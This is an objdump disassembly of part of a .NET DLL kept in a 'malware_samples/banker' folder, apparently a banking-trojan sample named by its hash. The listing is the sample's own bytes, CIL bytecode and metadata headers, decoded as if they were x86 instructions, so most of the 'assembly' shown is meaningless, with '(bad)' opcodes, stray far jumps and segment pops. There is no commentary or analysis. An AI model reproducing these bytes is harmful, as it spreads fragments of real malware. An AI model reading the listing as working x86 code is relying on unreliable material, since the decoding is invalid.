
malware_samples/banker/860b51a0e1fd406307b9732f64a13fb9abf8ffa9d3b8b3f46cdde15385463e8d.dll:     file format pei-i386


Disassembly of section .text:

10002000 <.text>:
10002000:	89 50 00             	mov    %edx,0x0(%eax)
10002003:	00 00                	add    %al,(%eax)
10002005:	00 00                	add    %al,(%eax)
10002007:	00 48 00             	add    %cl,0x0(%eax)
1000200a:	00 00                	add    %al,(%eax)
1000200c:	02 00                	add    (%eax),%al
1000200e:	05 00 98 24 00       	add    $0x249800,%eax
10002013:	00 0c 2b             	add    %cl,(%ebx,%ebp,1)
10002016:	00 00                	add    %al,(%eax)
10002018:	01 00                	add    %eax,(%eax)
	...
1000204e:	00 00                	add    %al,(%eax)
10002050:	1b 30                	sbb    (%eax),%esi
10002052:	0a 00                	or     (%eax),%al
10002054:	7a 01                	jp     0x10002057
10002056:	00 00                	add    %al,(%eax)
10002058:	01 00                	add    %eax,(%eax)
1000205a:	00 11                	add    %dl,(%ecx)
1000205c:	12 00                	adc    (%eax),%al
1000205e:	fe                   	(bad)
1000205f:	15 03 00 00 02       	adc    $0x2000003,%eax
10002064:	12 00                	adc    (%eax),%al
10002066:	06                   	push   %es
10002067:	28 01                	sub    %al,(%ecx)
10002069:	00 00                	add    %al,(%eax)
1000206b:	2b 7d 01             	sub    0x1(%ebp),%edi
1000206e:	00 00                	add    %al,(%eax)
10002070:	04 12                	add    $0x12,%al
10002072:	01 fe                	add    %edi,%esi
10002074:	15 04 00 00 02       	adc    $0x2000004,%eax
10002079:	28 08                	sub    %cl,(%eax)
1000207b:	00 00                	add    %al,(%eax)
1000207d:	06                   	push   %es
1000207e:	14 7e                	adc    $0x7e,%al
10002080:	11 00                	adc    %eax,(%eax)
10002082:	00 0a                	add    %cl,(%edx)
10002084:	7e 11                	jle    0x10002097
10002086:	00 00                	add    %al,(%eax)
10002088:	0a 16                	or     (%esi),%dl
1000208a:	1a 7e 11             	sbb    0x11(%esi),%bh
1000208d:	00 00                	add    %al,(%eax)
1000208f:	0a 14 12             	or     (%edx,%edx,1),%dl
10002092:	00 12                	add    %dl,(%edx)
10002094:	01 28                	add    %ebp,(%eax)
10002096:	01 00                	add    %eax,(%eax)
10002098:	00 06                	add    %al,(%esi)
1000209a:	2d 01 2a 00 07       	sub    $0x7002a01,%eax
1000209f:	7b 13                	jnp    0x100020b4
100020a1:	00 00                	add    %al,(%eax)
100020a3:	04 7e                	add    $0x7e,%al
100020a5:	11 00                	adc    %eax,(%eax)
100020a7:	00 0a                	add    %cl,(%edx)
100020a9:	03 8e 69 20 00 30    	add    0x30002069(%esi),%ecx
100020af:	00 00                	add    %al,(%eax)
100020b1:	1f                   	pop    %ds
100020b2:	40                   	inc    %eax
100020b3:	28 07                	sub    %al,(%edi)
100020b5:	00 00                	add    %al,(%eax)
100020b7:	06                   	push   %es
100020b8:	0c 08                	or     $0x8,%al
100020ba:	7e 11                	jle    0x100020cd
100020bc:	00 00                	add    %al,(%eax)
100020be:	0a 28                	or     (%eax),%ch
100020c0:	12 00                	adc    (%eax),%al
100020c2:	00 0a                	add    %cl,(%edx)
100020c4:	2c 38                	sub    $0x38,%al
100020c6:	28 13                	sub    %dl,(%ebx)
100020c8:	00 00                	add    %al,(%eax)
100020ca:	0a 28                	or     (%eax),%ch
100020cc:	13 00                	adc    (%eax),%eax
100020ce:	00 0a                	add    %cl,(%edx)
100020d0:	72 01                	jb     0x100020d3
100020d2:	00 00                	add    %al,(%eax)
100020d4:	70 28                	jo     0x100020fe
100020d6:	14 00                	adc    $0x0,%al
100020d8:	00 0a                	add    %cl,(%edx)
100020da:	6f                   	outsl  %ds:(%esi),(%dx)
100020db:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100020e0:	d4 04                	aam    $0x4
100020e2:	00 70 72             	add    %dh,0x72(%eax)
100020e5:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100020ec:	00 0a                	add    %cl,(%edx)
100020ee:	28 14 00             	sub    %dl,(%eax,%eax,1)
100020f1:	00 0a                	add    %cl,(%edx)
100020f3:	6f                   	outsl  %ds:(%esi),(%dx)
100020f4:	15 00 00 0a 73       	adc    $0x730a0000,%eax
100020f9:	17                   	pop    %ss
100020fa:	00 00                	add    %al,(%eax)
100020fc:	0a 7a 07             	or     0x7(%edx),%bh
100020ff:	7b 13                	jnp    0x10002114
10002101:	00 00                	add    %al,(%eax)
10002103:	04 08                	add    $0x8,%al
10002105:	03 03                	add    (%ebx),%eax
10002107:	8e 69 12             	mov    0x12(%ecx),%gs
1000210a:	04 28                	add    $0x28,%al
1000210c:	03 00                	add    (%eax),%eax
1000210e:	00 06                	add    %al,(%esi)
10002110:	2d 38 28 13 00       	sub    $0x132838,%eax
10002115:	00 0a                	add    %cl,(%edx)
10002117:	28 13                	sub    %dl,(%ebx)
10002119:	00 00                	add    %al,(%eax)
1000211b:	0a 72 ec             	or     -0x14(%edx),%dh
1000211e:	04 00                	add    $0x0,%al
10002120:	70 28                	jo     0x1000214a
10002122:	14 00                	adc    $0x0,%al
10002124:	00 0a                	add    %cl,(%edx)
10002126:	6f                   	outsl  %ds:(%esi),(%dx)
10002127:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000212c:	af                   	scas   %es:(%edi),%eax
1000212d:	0a 00                	or     (%eax),%al
1000212f:	70 72                	jo     0x100021a3
10002131:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002138:	00 0a                	add    %cl,(%edx)
1000213a:	28 14 00             	sub    %dl,(%eax,%eax,1)
1000213d:	00 0a                	add    %cl,(%edx)
1000213f:	6f                   	outsl  %ds:(%esi),(%dx)
10002140:	15 00 00 0a 73       	adc    $0x730a0000,%eax
10002145:	17                   	pop    %ss
10002146:	00 00                	add    %al,(%eax)
10002148:	0a 7a 07             	or     0x7(%edx),%bh
1000214b:	7b 13                	jnp    0x10002160
1000214d:	00 00                	add    %al,(%eax)
1000214f:	04 7e                	add    $0x7e,%al
10002151:	11 00                	adc    %eax,(%eax)
10002153:	00 0a                	add    %cl,(%edx)
10002155:	16                   	push   %ss
10002156:	08 7e 11             	or     %bh,0x11(%esi)
10002159:	00 00                	add    %al,(%eax)
1000215b:	0a 16                	or     (%esi),%dl
1000215d:	12 04 28             	adc    (%eax,%ebp,1),%al
10002160:	06                   	push   %es
10002161:	00 00                	add    %al,(%eax)
10002163:	06                   	push   %es
10002164:	0d 09 7e 11 00       	or     $0x117e09,%eax
10002169:	00 0a                	add    %cl,(%edx)
1000216b:	28 12                	sub    %dl,(%edx)
1000216d:	00 00                	add    %al,(%eax)
1000216f:	0a 2d 45 09 12 06    	or     0x6120945,%ch
10002175:	28 02                	sub    %al,(%edx)
10002177:	00 00                	add    %al,(%eax)
10002179:	06                   	push   %es
1000217a:	2c 12                	sub    $0x12,%al
1000217c:	11 06                	adc    %eax,(%esi)
1000217e:	20 03                	and    %al,(%ebx)
10002180:	01 00                	add    %eax,(%eax)
10002182:	00 33                	add    %dh,(%ebx)
10002184:	0b 1f                	or     (%edi),%ebx
10002186:	64 28 18             	sub    %bl,%fs:(%eax)
10002189:	00 00                	add    %al,(%eax)
1000218b:	0a 2b                	or     (%ebx),%ch
1000218d:	e4 de                	in     $0xde,%al
1000218f:	45                   	inc    %ebp
10002190:	07                   	pop    %es
10002191:	7b 15                	jnp    0x100021a8
10002193:	00 00                	add    %al,(%eax)
10002195:	04 28                	add    $0x28,%al
10002197:	19 00                	sbb    %eax,(%eax)
10002199:	00 0a                	add    %cl,(%edx)
1000219b:	13 05 11 05 6f 1a    	adc    0x1a6f0511,%eax
100021a1:	00 00                	add    %al,(%eax)
100021a3:	0a 16                	or     (%esi),%dl
100021a5:	fe 01                	incb   (%ecx)
100021a7:	2c 07                	sub    $0x7,%al
100021a9:	11 05 6f 1b 00 00    	adc    %eax,0x1b6f
100021af:	0a 09                	or     (%ecx),%cl
100021b1:	28 05 00 00 06 26    	sub    %al,0x26060000
100021b7:	de 1c 26             	ficomps (%esi,%eiz,1)
100021ba:	de 19                	ficomps (%ecx)
100021bc:	07                   	pop    %es
100021bd:	7b 13                	jnp    0x100021d2
100021bf:	00 00                	add    %al,(%eax)
100021c1:	04 28                	add    $0x28,%al
100021c3:	05 00 00 06 26       	add    $0x26060000,%eax
100021c8:	07                   	pop    %es
100021c9:	7b 14                	jnp    0x100021df
100021cb:	00 00                	add    %al,(%eax)
100021cd:	04 28                	add    $0x28,%al
100021cf:	05 00 00 06 26       	add    $0x26060000,%eax
100021d4:	dc 2a                	fsubrl (%edx)
100021d6:	00 00                	add    %al,(%eax)
100021d8:	41                   	inc    %ecx
100021d9:	34 00                	xor    $0x0,%al
100021db:	00 00                	add    %al,(%eax)
100021dd:	00 00                	add    %al,(%eax)
100021df:	00 42 00             	add    %al,0x0(%edx)
100021e2:	00 00                	add    %al,(%eax)
100021e4:	1b 01                	sbb    (%ecx),%eax
100021e6:	00 00                	add    %al,(%eax)
100021e8:	5d                   	pop    %ebp
100021e9:	01 00                	add    %eax,(%eax)
100021eb:	00 03                	add    %al,(%ebx)
100021ed:	00 00                	add    %al,(%eax)
100021ef:	00 12                	add    %dl,(%edx)
100021f1:	00 00                	add    %al,(%eax)
100021f3:	01 02                	add    %eax,(%edx)
100021f5:	00 00                	add    %al,(%eax)
100021f7:	00 42 00             	add    %al,0x0(%edx)
100021fa:	00 00                	add    %al,(%eax)
100021fc:	1e                   	push   %ds
100021fd:	01 00                	add    %eax,(%eax)
100021ff:	00 60 01             	add    %ah,0x1(%eax)
10002202:	00 00                	add    %al,(%eax)
10002204:	19 00                	sbb    %eax,(%eax)
10002206:	00 00                	add    %al,(%eax)
10002208:	00 00                	add    %al,(%eax)
1000220a:	00 00                	add    %al,(%eax)
1000220c:	13 30                	adc    (%eax),%esi
1000220e:	07                   	pop    %es
1000220f:	00 62 02             	add    %ah,0x2(%edx)
10002212:	00 00                	add    %al,(%eax)
10002214:	02 00                	add    (%eax),%al
10002216:	00 11                	add    %dl,(%ecx)
10002218:	73 09                	jae    0x10002223
1000221a:	00 00                	add    %al,(%eax)
1000221c:	06                   	push   %es
1000221d:	0a 06                	or     (%esi),%al
1000221f:	73 1c                	jae    0x1000223d
10002221:	00 00                	add    %al,(%eax)
10002223:	0a 25 28 13 00 00    	or     0x1328,%ah
10002229:	0a 28                	or     (%eax),%ch
1000222b:	13 00                	adc    (%eax),%eax
1000222d:	00 0a                	add    %cl,(%edx)
1000222f:	72 c5                	jb     0x100021f6
10002231:	0a 00                	or     (%eax),%al
10002233:	70 28                	jo     0x1000225d
10002235:	14 00                	adc    $0x0,%al
10002237:	00 0a                	add    %cl,(%edx)
10002239:	6f                   	outsl  %ds:(%esi),(%dx)
1000223a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000223f:	78 0c                	js     0x1000224d
10002241:	00 70 72             	add    %dh,0x72(%eax)
10002244:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000224b:	00 0a                	add    %cl,(%edx)
1000224d:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002250:	00 0a                	add    %cl,(%edx)
10002252:	6f                   	outsl  %ds:(%esi),(%dx)
10002253:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002258:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
1000225d:	28 13                	sub    %dl,(%ebx)
1000225f:	00 00                	add    %al,(%eax)
10002261:	0a 28                	or     (%eax),%ch
10002263:	13 00                	adc    (%eax),%eax
10002265:	00 0a                	add    %cl,(%edx)
10002267:	72 8e                	jb     0x100021f7
10002269:	0c 00                	or     $0x0,%al
1000226b:	70 28                	jo     0x10002295
1000226d:	14 00                	adc    $0x0,%al
1000226f:	00 0a                	add    %cl,(%edx)
10002271:	6f                   	outsl  %ds:(%esi),(%dx)
10002272:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002277:	41                   	inc    %ecx
10002278:	0e                   	push   %cs
10002279:	00 70 72             	add    %dh,0x72(%eax)
1000227c:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002283:	00 0a                	add    %cl,(%edx)
10002285:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002288:	00 0a                	add    %cl,(%edx)
1000228a:	6f                   	outsl  %ds:(%esi),(%dx)
1000228b:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002290:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002295:	28 13                	sub    %dl,(%ebx)
10002297:	00 00                	add    %al,(%eax)
10002299:	0a 28                	or     (%eax),%ch
1000229b:	13 00                	adc    (%eax),%eax
1000229d:	00 0a                	add    %cl,(%edx)
1000229f:	72 57                	jb     0x100022f8
100022a1:	0e                   	push   %cs
100022a2:	00 70 28             	add    %dh,0x28(%eax)
100022a5:	14 00                	adc    $0x0,%al
100022a7:	00 0a                	add    %cl,(%edx)
100022a9:	6f                   	outsl  %ds:(%esi),(%dx)
100022aa:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100022af:	12 0f                	adc    (%edi),%cl
100022b1:	00 70 72             	add    %dh,0x72(%eax)
100022b4:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100022bb:	00 0a                	add    %cl,(%edx)
100022bd:	28 14 00             	sub    %dl,(%eax,%eax,1)
100022c0:	00 0a                	add    %cl,(%edx)
100022c2:	6f                   	outsl  %ds:(%esi),(%dx)
100022c3:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100022c8:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
100022cd:	28 13                	sub    %dl,(%ebx)
100022cf:	00 00                	add    %al,(%eax)
100022d1:	0a 28                	or     (%eax),%ch
100022d3:	13 00                	adc    (%eax),%eax
100022d5:	00 0a                	add    %cl,(%edx)
100022d7:	72 28                	jb     0x10002301
100022d9:	0f 00                	(bad)
100022db:	70 28                	jo     0x10002305
100022dd:	14 00                	adc    $0x0,%al
100022df:	00 0a                	add    %cl,(%edx)
100022e1:	6f                   	outsl  %ds:(%esi),(%dx)
100022e2:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100022e7:	e3 0f                	jecxz  0x100022f8
100022e9:	00 70 72             	add    %dh,0x72(%eax)
100022ec:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100022f3:	00 0a                	add    %cl,(%edx)
100022f5:	28 14 00             	sub    %dl,(%eax,%eax,1)
100022f8:	00 0a                	add    %cl,(%edx)
100022fa:	6f                   	outsl  %ds:(%esi),(%dx)
100022fb:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002300:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002305:	28 13                	sub    %dl,(%ebx)
10002307:	00 00                	add    %al,(%eax)
10002309:	0a 28                	or     (%eax),%ch
1000230b:	13 00                	adc    (%eax),%eax
1000230d:	00 0a                	add    %cl,(%edx)
1000230f:	72 f9                	jb     0x1000230a
10002311:	0f 00                	(bad)
10002313:	70 28                	jo     0x1000233d
10002315:	14 00                	adc    $0x0,%al
10002317:	00 0a                	add    %cl,(%edx)
10002319:	6f                   	outsl  %ds:(%esi),(%dx)
1000231a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000231f:	f4                   	hlt
10002320:	10 00                	adc    %al,(%eax)
10002322:	70 72                	jo     0x10002396
10002324:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000232b:	00 0a                	add    %cl,(%edx)
1000232d:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002330:	00 0a                	add    %cl,(%edx)
10002332:	6f                   	outsl  %ds:(%esi),(%dx)
10002333:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002338:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
1000233d:	28 13                	sub    %dl,(%ebx)
1000233f:	00 00                	add    %al,(%eax)
10002341:	0a 28                	or     (%eax),%ch
10002343:	13 00                	adc    (%eax),%eax
10002345:	00 0a                	add    %cl,(%edx)
10002347:	72 0a                	jb     0x10002353
10002349:	11 00                	adc    %eax,(%eax)
1000234b:	70 28                	jo     0x10002375
1000234d:	14 00                	adc    $0x0,%al
1000234f:	00 0a                	add    %cl,(%edx)
10002351:	6f                   	outsl  %ds:(%esi),(%dx)
10002352:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002357:	84 11                	test   %dl,(%ecx)
10002359:	00 70 72             	add    %dh,0x72(%eax)
1000235c:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002363:	00 0a                	add    %cl,(%edx)
10002365:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002368:	00 0a                	add    %cl,(%edx)
1000236a:	6f                   	outsl  %ds:(%esi),(%dx)
1000236b:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002370:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002375:	28 13                	sub    %dl,(%ebx)
10002377:	00 00                	add    %al,(%eax)
10002379:	0a 28                	or     (%eax),%ch
1000237b:	13 00                	adc    (%eax),%eax
1000237d:	00 0a                	add    %cl,(%edx)
1000237f:	72 9a                	jb     0x1000231b
10002381:	11 00                	adc    %eax,(%eax)
10002383:	70 28                	jo     0x100023ad
10002385:	14 00                	adc    $0x0,%al
10002387:	00 0a                	add    %cl,(%edx)
10002389:	6f                   	outsl  %ds:(%esi),(%dx)
1000238a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000238f:	0d 13 00 70 72       	or     $0x72700013,%eax
10002394:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000239b:	00 0a                	add    %cl,(%edx)
1000239d:	28 14 00             	sub    %dl,(%eax,%eax,1)
100023a0:	00 0a                	add    %cl,(%edx)
100023a2:	6f                   	outsl  %ds:(%esi),(%dx)
100023a3:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100023a8:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
100023ad:	28 13                	sub    %dl,(%ebx)
100023af:	00 00                	add    %al,(%eax)
100023b1:	0a 28                	or     (%eax),%ch
100023b3:	13 00                	adc    (%eax),%eax
100023b5:	00 0a                	add    %cl,(%edx)
100023b7:	72 23                	jb     0x100023dc
100023b9:	13 00                	adc    (%eax),%eax
100023bb:	70 28                	jo     0x100023e5
100023bd:	14 00                	adc    $0x0,%al
100023bf:	00 0a                	add    %cl,(%edx)
100023c1:	6f                   	outsl  %ds:(%esi),(%dx)
100023c2:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100023c7:	1e                   	push   %ds
100023c8:	14 00                	adc    $0x0,%al
100023ca:	70 72                	jo     0x1000243e
100023cc:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100023d3:	00 0a                	add    %cl,(%edx)
100023d5:	28 14 00             	sub    %dl,(%eax,%eax,1)
100023d8:	00 0a                	add    %cl,(%edx)
100023da:	6f                   	outsl  %ds:(%esi),(%dx)
100023db:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100023e0:	1d 00 00 0a 7d       	sbb    $0x7d0a0000,%eax
100023e5:	17                   	pop    %ss
100023e6:	00 00                	add    %al,(%eax)
100023e8:	04 28                	add    $0x28,%al
100023ea:	13 00                	adc    (%eax),%eax
100023ec:	00 0a                	add    %cl,(%edx)
100023ee:	28 13                	sub    %dl,(%ebx)
100023f0:	00 00                	add    %al,(%eax)
100023f2:	0a 72 34             	or     0x34(%edx),%dh
100023f5:	14 00                	adc    $0x0,%al
100023f7:	70 28                	jo     0x10002421
100023f9:	14 00                	adc    $0x0,%al
100023fb:	00 0a                	add    %cl,(%edx)
100023fd:	6f                   	outsl  %ds:(%esi),(%dx)
100023fe:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002403:	b7 19                	mov    $0x19,%bh
10002405:	00 70 72             	add    %dh,0x72(%eax)
10002408:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000240f:	00 0a                	add    %cl,(%edx)
10002411:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002414:	00 0a                	add    %cl,(%edx)
10002416:	6f                   	outsl  %ds:(%esi),(%dx)
10002417:	15 00 00 0a 28       	adc    $0x280a0000,%eax
1000241c:	13 00                	adc    (%eax),%eax
1000241e:	00 0a                	add    %cl,(%edx)
10002420:	28 13                	sub    %dl,(%ebx)
10002422:	00 00                	add    %al,(%eax)
10002424:	0a 72 cd             	or     -0x33(%edx),%dh
10002427:	19 00                	sbb    %eax,(%eax)
10002429:	70 28                	jo     0x10002453
1000242b:	14 00                	adc    $0x0,%al
1000242d:	00 0a                	add    %cl,(%edx)
1000242f:	6f                   	outsl  %ds:(%esi),(%dx)
10002430:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002435:	88 1a                	mov    %bl,(%edx)
10002437:	00 70 72             	add    %dh,0x72(%eax)
1000243a:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002441:	00 0a                	add    %cl,(%edx)
10002443:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002446:	00 0a                	add    %cl,(%edx)
10002448:	6f                   	outsl  %ds:(%esi),(%dx)
10002449:	15 00 00 0a 17       	adc    $0x170a0000,%eax
1000244e:	28 1e                	sub    %bl,(%esi)
10002450:	00 00                	add    %al,(%eax)
10002452:	0a 06                	or     (%esi),%al
10002454:	fe 06                	incb   (%esi)
10002456:	0a 00                	or     (%eax),%al
10002458:	00 06                	add    %al,(%esi)
1000245a:	73 1f                	jae    0x1000247b
1000245c:	00 00                	add    %al,(%eax)
1000245e:	0a 28                	or     (%eax),%ch
10002460:	02 00                	add    (%eax),%al
10002462:	00 2b                	add    %ch,(%ebx)
10002464:	28 03                	sub    %al,(%ebx)
10002466:	00 00                	add    %al,(%eax)
10002468:	2b 0b                	sub    (%ebx),%ecx
1000246a:	07                   	pop    %es
1000246b:	73 22                	jae    0x1000248f
1000246d:	00 00                	add    %al,(%eax)
1000246f:	0a 07                	or     (%edi),%al
10002471:	8e 69 6f             	mov    0x6f(%ecx),%gs
10002474:	23 00                	and    (%eax),%eax
10002476:	00 0a                	add    %cl,(%edx)
10002478:	9a 2a 1e 02 28 24 00 	lcall  $0x24,$0x28021e2a
1000247f:	00 0a                	add    %cl,(%edx)
10002481:	2a 4a 02             	sub    0x2(%edx),%cl
10002484:	7b 17                	jnp    0x1000249d
10002486:	00 00                	add    %al,(%eax)
10002488:	04 03                	add    $0x3,%al
1000248a:	28 25 00 00 0a 6f    	sub    %ah,0x6f0a0000
10002490:	26 00 00             	add    %al,%es:(%eax)
10002493:	0a 2a                	or     (%edx),%ch
10002495:	00 00                	add    %al,(%eax)
10002497:	00 42 53             	add    %al,0x53(%edx)
1000249a:	4a                   	dec    %edx
1000249b:	42                   	inc    %edx
1000249c:	01 00                	add    %eax,(%eax)
1000249e:	01 00                	add    %eax,(%eax)
100024a0:	00 00                	add    %al,(%eax)
100024a2:	00 00                	add    %al,(%eax)
100024a4:	0c 00                	or     $0x0,%al
100024a6:	00 00                	add    %al,(%eax)
100024a8:	76 34                	jbe    0x100024de
100024aa:	2e 30 2e             	xor    %ch,%cs:(%esi)
100024ad:	33 30                	xor    (%eax),%esi
100024af:	33 31                	xor    (%ecx),%esi
100024b1:	39 00                	cmp    %eax,(%eax)
100024b3:	00 00                	add    %al,(%eax)
100024b5:	00 05 00 6c 00 00    	add    %al,0x6c00
100024bb:	00 3c 05 00 00 23 7e 	add    %bh,0x7e230000(,%eax,1)
100024c2:	00 00                	add    %al,(%eax)
100024c4:	a8 05                	test   $0x5,%al
100024c6:	00 00                	add    %al,(%eax)
100024c8:	98                   	cwtl
100024c9:	08 00                	or     %al,(%eax)
100024cb:	00 23                	add    %ah,(%ebx)
100024cd:	53                   	push   %ebx
100024ce:	74 72                	je     0x10002542
100024d0:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
100024d7:	00 40 0e             	add    %al,0xe(%eax)
100024da:	00 00                	add    %al,(%eax)
100024dc:	a0 1a 00 00 23       	mov    0x2300001a,%al
100024e1:	55                   	push   %ebp
100024e2:	53                   	push   %ebx
100024e3:	00 e0                	add    %ah,%al
100024e5:	28 00                	sub    %al,(%eax)
100024e7:	00 10                	add    %dl,(%eax)
100024e9:	00 00                	add    %al,(%eax)
100024eb:	00 23                	add    %ah,(%ebx)
100024ed:	47                   	inc    %edi
100024ee:	55                   	push   %ebp
100024ef:	49                   	dec    %ecx
100024f0:	44                   	inc    %esp
100024f1:	00 00                	add    %al,(%eax)
100024f3:	00 f0                	add    %dh,%al
100024f5:	28 00                	sub    %al,(%eax)
100024f7:	00 1c 02             	add    %bl,(%edx,%eax,1)
100024fa:	00 00                	add    %al,(%eax)
100024fc:	23 42 6c             	and    0x6c(%edx),%eax
100024ff:	6f                   	outsl  %ds:(%esi),(%dx)
10002500:	62 00                	bound  %eax,(%eax)
10002502:	00 00                	add    %al,(%eax)
10002504:	00 00                	add    %al,(%eax)
10002506:	00 00                	add    %al,(%eax)
10002508:	02 00                	add    (%eax),%al
1000250a:	00 01                	add    %al,(%ecx)
1000250c:	57                   	push   %edi
1000250d:	15 02 1c 09 0a       	adc    $0xa091c02,%eax
10002512:	00 00                	add    %al,(%eax)
10002514:	00 fa                	add    %bh,%dl
10002516:	01 33                	add    %esi,(%ebx)
10002518:	00 16                	add    %dl,(%esi)
1000251a:	00 00                	add    %al,(%eax)
1000251c:	01 00                	add    %eax,(%eax)
1000251e:	00 00                	add    %al,(%eax)
10002520:	22 00                	and    (%eax),%al
10002522:	00 00                	add    %al,(%eax)
10002524:	05 00 00 00 17       	add    $0x17000000,%eax
10002529:	00 00                	add    %al,(%eax)
1000252b:	00 0a                	add    %cl,(%edx)
1000252d:	00 00                	add    %al,(%eax)
1000252f:	00 21                	add    %ah,(%ecx)
10002531:	00 00                	add    %al,(%eax)
10002533:	00 26                	add    %ah,(%esi)
10002535:	00 00                	add    %al,(%eax)
10002537:	00 10                	add    %dl,(%eax)
10002539:	00 00                	add    %al,(%eax)
1000253b:	00 02                	add    %al,(%edx)
1000253d:	00 00                	add    %al,(%eax)
1000253f:	00 01                	add    %al,(%ecx)
10002541:	00 00                	add    %al,(%eax)
10002543:	00 02                	add    %al,(%edx)
10002545:	00 00                	add    %al,(%eax)
10002547:	00 06                	add    %al,(%esi)
10002549:	00 00                	add    %al,(%eax)
1000254b:	00 01                	add    %al,(%ecx)
1000254d:	00 00                	add    %al,(%eax)
1000254f:	00 03                	add    %al,(%ebx)
10002551:	00 00                	add    %al,(%eax)
10002553:	00 03                	add    %al,(%ebx)
10002555:	00 00                	add    %al,(%eax)
10002557:	00 03                	add    %al,(%ebx)
10002559:	00 00                	add    %al,(%eax)
1000255b:	00 00                	add    %al,(%eax)
1000255d:	00 31                	add    %dh,(%ecx)
1000255f:	06                   	push   %es
10002560:	01 00                	add    %eax,(%eax)
10002562:	00 00                	add    %al,(%eax)
10002564:	00 00                	add    %al,(%eax)
10002566:	06                   	push   %es
10002567:	00 88 04 49 07 06    	add    %cl,0x6074904(%eax)
1000256d:	00 f5                	add    %dh,%ch
1000256f:	04 49                	add    $0x49,%al
10002571:	07                   	pop    %es
10002572:	06                   	push   %es
10002573:	00 bc 03 17 07 0f 00 	add    %bh,0xf0717(%ebx,%eax,1)
1000257a:	69 07 00 00 06 00    	imul   $0x60000,(%edi),%eax
10002580:	e4 03                	in     $0x3,%al
10002582:	87 06                	xchg   %eax,(%esi)
10002584:	06                   	push   %es
10002585:	00 6b 04             	add    %ch,0x4(%ebx)
10002588:	87 06                	xchg   %eax,(%esi)
1000258a:	06                   	push   %es
1000258b:	00 4c 04 87          	add    %cl,-0x79(%esp,%eax,1)
1000258f:	06                   	push   %es
10002590:	06                   	push   %es
10002591:	00 dc                	add    %bl,%ah
10002593:	04 87                	add    $0x87,%al
10002595:	06                   	push   %es
10002596:	06                   	push   %es
10002597:	00 a8 04 87 06 06    	add    %ch,0x6068704(%eax)
1000259d:	00 c1                	add    %al,%cl
1000259f:	04 87                	add    $0x87,%al
100025a1:	06                   	push   %es
100025a2:	06                   	push   %es
100025a3:	00 fb                	add    %bh,%bl
100025a5:	03 87 06 06 00 d0    	add    -0x2ffff9fa(%edi),%eax
100025ab:	03 2a                	add    (%edx),%ebp
100025ad:	07                   	pop    %es
100025ae:	06                   	push   %es
100025af:	00 ae 03 2a 07 06    	add    %ch,0x6072a03(%esi)
100025b5:	00 2f                	add    %ch,(%edi)
100025b7:	04 87                	add    $0x87,%al
100025b9:	06                   	push   %es
100025ba:	06                   	push   %es
100025bb:	00 16                	add    %dl,(%esi)
100025bd:	04 69                	add    $0x69,%al
100025bf:	05 06 00 a7 07       	add    $0x7a70006,%eax
100025c4:	49                   	dec    %ecx
100025c5:	06                   	push   %es
100025c6:	0a 00                	or     (%eax),%al
100025c8:	9f                   	lahf
100025c9:	07                   	pop    %es
100025ca:	17                   	pop    %ss
100025cb:	07                   	pop    %es
100025cc:	06                   	push   %es
100025cd:	00 a6 06 49 06 06    	add    %ah,0x6064906(%esi)
100025d3:	00 93 03 49 07 06    	add    %dl,0x6074903(%ebx)
100025d9:	00 77 03             	add    %dh,0x3(%edi)
100025dc:	49                   	dec    %ecx
100025dd:	06                   	push   %es
100025de:	06                   	push   %es
100025df:	00 6e 00             	add    %ch,0x0(%esi)
100025e2:	f2 02 06             	repnz add (%esi),%al
100025e5:	00 1c 06             	add    %bl,(%esi,%eax,1)
100025e8:	2a 07                	sub    (%edi),%al
100025ea:	06                   	push   %es
100025eb:	00 f8                	add    %bh,%al
100025ed:	06                   	push   %es
100025ee:	49                   	dec    %ecx
100025ef:	06                   	push   %es
100025f0:	06                   	push   %es
100025f1:	00 60 05             	add    %ah,0x5(%eax)
100025f4:	d1 07                	roll   $1,(%edi)
100025f6:	06                   	push   %es
